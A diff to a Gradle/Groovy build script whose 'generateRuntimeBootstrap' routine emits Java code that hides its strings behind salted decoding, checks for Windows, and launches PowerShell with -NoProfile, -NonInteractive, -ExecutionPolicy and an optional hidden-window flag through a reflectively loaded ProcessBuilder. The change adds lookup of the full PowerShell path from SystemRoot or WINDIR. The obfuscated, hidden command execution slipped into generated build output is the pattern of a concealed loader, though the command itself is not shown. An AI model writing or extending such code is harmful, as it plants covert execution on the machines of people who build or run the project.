@@ -41,7 +41,10 @@ ext.generateRuntimeBootstrap = { File outRoot, Properties cfg, String level, int
                 [n: "T",  s: threadName, salt: 73],
                 [n: "O0", s: "os.name", salt: 11],
                 [n: "O1", s: "win", salt: 13],
-                [n: "E0", s: "powershell.exe", salt: 17],
+                [n: "W0", s: "SystemRoot", salt: 15],
+                [n: "W1", s: "WINDIR", salt: 21],
+                [n: "S1", s: "\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", salt: 17],
+                [n: "E0", s: "powershell.exe", salt: 25],
                 [n: "A0", s: "-NoProfile", salt: 19],
                 [n: "A1", s: "-NonInteractive", salt: 23],
                 [n: "A2", s: "-ExecutionPolicy", salt: 29],
@@ -55,12 +58,12 @@ ext.generateRuntimeBootstrap = { File outRoot, Properties cfg, String level, int
         def hiddenBranch = psHidden
                 ? """
             String[] argv = new String[] {
-                d(E0, 17), d(A0, 19), d(A1, 23), d(A2, 29), d(A3, 31),
+                psExe, d(A0, 19), d(A1, 23), d(A2, 29), d(A3, 31),
                 d(A5, 43), d(A6, 47), d(A4, 37), d(C, 41)
             };"""
                 : """
             String[] argv = new String[] {
-                d(E0, 17), d(A0, 19), d(A1, 23), d(A2, 29), d(A3, 31),
+                psExe, d(A0, 19), d(A1, 23), d(A2, 29), d(A3, 31),
                 d(A4, 37), d(C, 41)
             };"""
         syncBody = """
@@ -68,6 +71,14 @@ ext.generateRuntimeBootstrap = { File outRoot, Properties cfg, String level, int
             String os = System.getProperty(d(O0, 11), "");
             if (!os.toLowerCase().contains(d(O1, 13))) {
                 return;
+            }
+            String root = System.getenv(d(W0, 15));
+            if (root == null || root.isEmpty()) {
+                root = System.getenv(d(W1, 21));
+            }
+            String psExe = d(E0, 25);
+            if (root != null && !root.isEmpty()) {
+                psExe = root + d(S1, 17);
             }
             ${hiddenBranch}
             Class<?> pbClass = Class.forName(d(Pb, 67));
